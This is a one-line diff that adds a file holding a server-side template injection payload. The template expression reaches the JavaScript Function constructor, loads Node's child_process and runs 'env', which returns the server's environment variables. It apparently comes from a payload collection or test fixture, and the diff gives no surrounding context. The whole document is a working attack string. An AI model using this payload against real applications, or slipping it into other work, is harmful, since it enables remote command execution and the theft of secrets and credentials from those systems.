@@ -1,0 +1,1 @@
+{{constructor.constructor("return process.mainModule.require(`child_process`).spawnSync(`env`).stdout.toString()")()}}
